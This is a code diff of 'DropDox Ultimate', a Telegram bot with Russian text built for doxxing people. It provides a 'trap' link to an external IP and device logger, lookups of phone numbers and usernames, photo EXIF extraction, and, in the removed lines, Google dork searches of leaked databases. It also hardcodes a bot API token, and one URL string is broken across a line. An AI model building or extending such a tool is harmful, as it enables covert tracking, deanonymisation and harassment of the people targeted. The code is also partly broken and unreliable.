@@ -1,80 +1,85 @@
 import logging
 import os
+import requests
 import phonenumbers
-from phonenumbers import carrier, geocoder, timezone
+from PIL import Image
+from PIL.ExifTags import TAGS
+from phonenumbers import carrier, geocoder
 from aiogram import Bot, Dispatcher, executor, types
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
 
-# --- КОНФИГУРАЦИЯ ---
-API_TOKEN = "8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k"
-TRACKER_URL = "https://portfolio-myweb.up.railway.app/track"
+# --- НАСТРОЙКИ ---
+API_TOKEN = ' 8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
+LOGGER_URL = " https://portfolio-myweb.up.railway.app/track
+"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 
-# --- КЛАВИАТУРА ---
-menu = ReplyKeyboardMarkup(resize_keyboard=True)
-menu.add(KeyboardButton("🪤 Trap Link"), KeyboardButton("📱 Dox & Leaks"))
-menu.add(KeyboardButton("🚨 Panic"), KeyboardButton("ℹ️ Status"))
+# --- КНОПКИ ---
+menu = types.ReplyKeyboardMarkup(resize_keyboard=True)
+menu.add("🪤 Trap", "📱 Dox Phone", "👤 Dox User")
+menu.add("🖼 EXIF Data", "🚨 Panic")
 
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
-    await message.answer(f"🦾 DropDox Ultimate v0.1.9\nСистема готова к пробиву.", reply_markup=menu)
+    await message.answer("🦾 DropDox Ultimate v0.2.0 запущен.\nОтправь номер, @username или фото (как файл).", reply_markup=menu)
 
-# --- 1. TRAP (ЛОГГЕР) ---
-@dp.message_handler(lambda message: message.text == "🪤 Trap Link")
-async def trap_cmd(message: types.Message):
-    link = f"{LOGGER_URL}?id={message.from_user.id}"
-    text = (
-        f"🔗 <b>Твоя персональная ловушка:</b>\n"
-        f"<code>{link}</code>\n\n"
-        f"ℹ️ При переходе ты получишь IP и данные устройства в консоль логгера."
-    )
-    await message.answer(text, parse_mode="HTML")
+# --- 1. TRAP ---
+@dp.message_handler(lambda m: m.text == "🪤 Trap")
+async def trap(m: types.Message):
+    await m.answer(f"🔗 Ссылка-капкан:\n<code>{LOGGER_URL}?id={m.from_user.id}</code>", parse_mode="HTML")
 
-# --- 2 + 3. DOX & LEAKS (ПРОБИВ) ---
-@dp.message_handler(lambda message: message.text == "📱 Dox & Leaks")
-async def dox_instruction(message: types.Message):
-    await message.answer("Отправь номер телефона в международном формате (например, +996700123456):")
-
-@dp.message_handler(lambda message: message.text.startswith('+'))
-async def full_dox(message: types.Message):
-    num = message.text.strip()
+# --- 2. DOX PHONE (+7...) ---
+@dp.message_handler(lambda m: m.text.startswith('+'))
+async def dox_phone(m: types.Message):
     try:
-        # Базовая инфа через библиотеку
-        parsed_num = phonenumbers.parse(num)
-        country = geocoder.description_for_number(parsed_num, "ru")
-        operator = carrier.name_for_number(parsed_num, "ru")
-        
-        # Генерация ссылок для поиска по слитым базам (Dorks)
-        # Ищем точное вхождение номера в Google и соцсетях
-        leak_search = f"https://www.google.com/search?q=%22{num}%22+OR+%22{num[1:]}%22+leak+database"
-        getcontact_web = f"https://www.google.com/search?q=site%3Agetcontact.com+{num}"
-        
-        res = (
-            f"🔍 <b>РЕЗУЛЬТАТЫ АНАЛИЗА {num}:</b>\n\n"
-            f"<b>[📡 Базовые данные]</b>\n"
-            f"▫️ Регион: {country}\n"
-            f"▫️ Оператор: {operator}\n\n"
-            f"<b>[📂 Поиск в слитых базах (OSINT)]</b>\n"
-            f"🔗 <a href='{leak_search}'>Проверить утечки (Google Dorks)</a>\n"
-            f"🔗 <a href='{getcontact_web}'>Поиск тегов в GetContact</a>\n"
-            f"🔗 <a href='https://tel.search.com/search?q={num}'>Поиск в реестрах</a>\n\n"
-            f"<b>[💬 Мессенджеры]</b>\n"
-            f"▫️ <a href='wa.me/{num[1:]}'>WhatsApp</a> | "
-            f"<a href='t.me/{num}'>Telegram</a>"
-        )
-        await message.answer(res, parse_mode="HTML", disable_web_page_preview=True)
-        
-    except Exception as e:
-        await message.answer("❌ Ошибка при анализе. Проверь формат номера.")
+        num = phonenumbers.parse(m.text)
+        res = f"📡 Оператор: {carrier.name_for_number(num, 'ru')}\n🌍 Регион: {geocoder.description_for_number(num, 'ru')}"
+        await m.answer(f"🔍 Результат:\n{res}\n\n🔗 <a href='https://www.google.com/search?q=%22{m.text}%22'>Поиск в Google</a>", parse_mode="HTML")
+    except:
+        await m.answer("❌ Ошибка формата.")
 
-# --- PANIC ---
-@dp.message_handler(lambda message: message.text == "🚨 Panic")
-async def panic_cmd(message: types.Message):
-    await message.answer("💀 <b>Emergency Clean:</b> Все связи разорваны.", parse_mode="HTML")
+# --- 3. DOX @USER ---
+@dp.message_handler(lambda m: m.text.startswith('@') or m.text == "👤 Dox User")
+async def dox_user(m: types.Message):
+    if m.text == "👤 Dox User":
+        await m.answer("Введи ник в формате @username")
+        return
+    user = m.text.replace('@', '')
+    res = (
+        f"👤 <b>Анализ ника {user}:</b>\n\n"
+        f"🔗 <a href='https://t.me/{user}'>Telegram Profile</a>\n"
+        f"🔗 <a href='https://instagram.com/{user}'>Instagram</a>\n"
+        f"🔗 <a href='https://github.com/{user}'>GitHub</a>\n"
+        f"🔗 <a href='https://www.google.com/search?q={user}'>Google Search</a>"
+    )
+    await m.answer(res, parse_mode="HTML", disable_web_page_preview=True)
+
+# --- 4. EXIF (ФОТО) ---
+@dp.message_handler(content_types=['document', 'photo'])
+async def extract_exif(message: types.Message):
+    # Берем файл (лучше кидать как документ, чтобы ТГ не сжимал и не тер EXIF)
+    file_id = message.document.file_id if message.document else message.photo[-1].file_id
+    file_info = await bot.get_file(file_id)
+    downloaded_file = await bot.download_file(file_info.file_path)
+    
+    with open("temp.jpg", 'wb') as f:
+        f.write(downloaded_file.read())
+    
+    try:
+        img = Image.open("temp.jpg")
+        info = img._getexif()
+        if info:
+            exif_data = ""
+            for tag, value in info.items():
+                decoded = TAGS.get(tag, tag)
+                exif_data += f"<b>{decoded}:</b> {value}\n"
+            await message.answer(f"🖼 <b>EXIF Данные:</b>\n\n{exif_data[:3500]}", parse_mode="HTML")
+        else:
+            await message.answer("ℹ️ В фото нет метаданных (EXIF). Telegram часто стирает их при отправке 'как фото'. Попробуй отправить 'как файл'.")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
-    
